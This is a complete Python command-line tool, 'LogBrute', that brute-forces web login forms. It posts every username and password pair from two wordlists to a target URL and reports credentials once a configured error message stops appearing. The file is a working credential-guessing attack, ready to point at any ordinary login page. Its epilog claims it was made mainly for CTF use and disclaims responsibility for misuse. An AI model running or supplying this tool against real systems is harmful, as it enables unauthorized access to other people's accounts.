#!/usr/bin/python3
from time import sleep
from colorama import Fore
import requests
import sys
import argparse
import pyfiglet


def get_args():
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,epilog=
    """Example:
        
    python3 LogBrute.py -t http://127.0.0.1:80 --path /login -P user.list -P passwd.list -u user_parm -p pass_parm -em 'Invalid username or password'
    
This tool crated mainly for CTF purpose . 
** Disclaimer: I'm not responsible for any illegal activities or damage by using this script. **
if request make more data to server add it manually because I'm lazy programmer :D
    """)
# metavar
    parser.add_argument("-t","--target",help="IP address or hostname of the target server",required=True)
    parser.add_argument("-u","--userparm",metavar="USER_PARM",help="Username parameter use on html login form. (<input name='username'>)",required=True)
    parser.add_argument("-p","--passparm",metavar="PASS_PARM",help="Password parameter use on html login form. (<input name='password'>)",required=True)
    parser.add_argument("-em","--error-msg",help="Error message prompts after entering wrong credentials.",required=True)
    parser.add_argument("--path",metavar="REQ_PATH",help="Path that login request make to server",required=True)
    parser.add_argument("-U","--userfile",metavar="USER_FILE",help="Username file path.",required=True)
    parser.add_argument("-P","--passfile",metavar="PASS_FILE",help="Password file path.",required=True)
    args = parser.parse_args()
    return args


class LogBrute():
    def __init__(self,args):
        self.args = args
        self.target = self.args.target
        self.userfile = self.args.userfile
        self.passfile = self.args.passfile
        self.path = self.args.path
        self.target = self.args.target
        self.userparm = self.args.userparm
        self.passparm = self.args.passparm
        self.error_msg = self.args.error_msg
        self.URL = str(self.target) + str(self.path)
        self.banner_print()

    def banner_print(self):
        self.banner = pyfiglet.figlet_format("LogBrute",font = "slant" )
        print(Fore.GREEN + self.banner + "\n\t\t\tBy ERUSHA SANDUSHAN\n")


    def read_data(self):
        try:
            with open(f"{self.userfile}","r", encoding="ISO-8859-1") as ufile:
                self.username_data = ufile.readlines()
        except FileNotFoundError:
            print(Fore.RED + "\n[-] Username List not found" + Fore.RESET)
            sys.exit(1)
        try:
            with open(f"{self.passfile}","r",encoding="ISO-8859-1") as pfile:
                self.password_data = pfile.readlines()
        except FileNotFoundError:
            print(Fore.RED + "\n[-] Password List not found" + Fore.RESET)
            sys.exit(1)
        return self.password_data,self.username_data

    def reqsend(self,user_data,pass_data):
        self.payload = {
            self.userparm:user_data,
            self.passparm:pass_data
        }
        # proxy = {'http':'http://127.0.0.1:8080'}
        req = requests.post(self.URL,data=self.payload)
        if str(self.error_msg) in req.text:
            return False
        
        else:
            print(Fore.GREEN + "\n\n[+] Success\n" + Fore.RESET)
            print(Fore.MAGENTA + "[*] Username : " + Fore.GREEN +  f"{user_data}" + Fore.RESET)
            print(Fore.MAGENTA + "[*] Password : " + Fore.GREEN +  f"{pass_data}" + Fore.RESET)
            print(Fore.GREEN + "\nHappy Hacking <3\n" + Fore.RESET)
            sys.exit()
    def run(self):
        self.read_data()
        req_count = 1
        print("[+] Using " + Fore.CYAN + f"{self.userfile}" + Fore.RESET  + Fore.GREEN + " and " + Fore.RESET + Fore.CYAN + f"{self.passfile}" + Fore.RESET +  Fore.GREEN + " to attack " + Fore.CYAN +  f"{self.target}\n" + Fore.RESET )

        for _ in range(len(self.username_data)):
            for e in range(len(self.password_data)):
                self.tempuser = self.username_data[_].split()[0]
                self.temppass = self.password_data[e].split()[0]
                req_count = req_count + 1
                print(Fore.GREEN + f"\rRequest Sent : {str(req_count)}" + Fore.RESET,end='')
                self.reqsend(self.tempuser,self.temppass)
                sleep(0.1)
        print(Fore.RED + "\n\n[!] Login Match Not found" +  Fore.RESET)
        sys.exit()   

if __name__ == "__main__":
    
    try:
        bruteforce = LogBrute(get_args())
        bruteforce.run()
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Exiting" + Fore.RESET)
